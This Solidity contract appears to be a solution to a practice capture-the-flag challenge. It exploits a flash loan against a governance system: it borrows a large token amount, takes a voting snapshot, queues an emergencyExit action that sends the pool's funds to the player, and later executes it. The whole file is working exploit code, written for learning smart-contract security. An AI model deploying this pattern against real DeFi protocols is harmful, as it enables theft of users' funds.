// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IFlashloan {
    function flashLoan(
        address _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external returns (bool);

    function queueAction(
        address target,
        uint128 value,
        bytes calldata data
    ) external returns (uint256 actionId);

    function executeAction(
        uint256 actionId
    ) external payable returns (bytes memory);
}

contract testFlashloanSimpleGovernance {
    address player;
    address flashLoan;
    address governance;
    address token;

    constructor(
        address _flashLoan,
        address _governance,
        address _token,
        address _player
    ) {
        flashLoan = _flashLoan;
        governance = _governance;
        token = _token;
        player = _player;
    }

    function start() external {
        // flashLoan(
        // IERC3156FlashBorrower _receiver,
        // address _token,
        // uint256 _amount,
        // bytes calldata _data
        IFlashloan(flashLoan).flashLoan(address(this), token, 1500000e18, "");
    }

    function end() external {
        // (bool suc, ) = governance.call(
        //     abi.encodeWithSignature("executeAction(uint256)", uint256(1))
        // );
        // require(suc, "executeAction");
        IFlashloan(governance).executeAction(1);
    }

    function onFlashLoan(
        address initiator,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        printTokenBalance(token, address(this), "onFlashLoan");
        token.call(abi.encodeWithSignature("snapshot()"));

        // queueAction(address target, uint128 value, bytes calldata data)
        // (bool suc, ) = governance.call(
        //     abi.encodeWithSignature(
        //         "queueAction(address,uint128,bytes)",
        //         flashLoan,
        //         uint128(0),
        //         abi.encodeWithSignature("emergencyExit(address)", player)
        //     )
        // );
        // require(suc, "queueAction");
        IFlashloan(governance).queueAction(
            flashLoan,
            uint128(0),
            abi.encodeWithSignature("emergencyExit(address)", player)
        );
        (bool suc, ) = _token.call(
            abi.encodeWithSignature(
                "approve(address,uint256)",
                flashLoan,
                1500000e18
            )
        );

        require(suc, "approve");

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function printTokenBalance(
        address _token,
        address addr,
        string memory msg
    ) public returns (uint256) {
        (bool suc, bytes memory bal) = _token.call(
            abi.encodeWithSignature("balanceOf(address)", addr)
        );
        require(suc, msg);
        uint256 balance = abi.decode(bal, (uint256));

        console.log(msg, balance);
        return balance;
    }

    receive() external payable {}
}
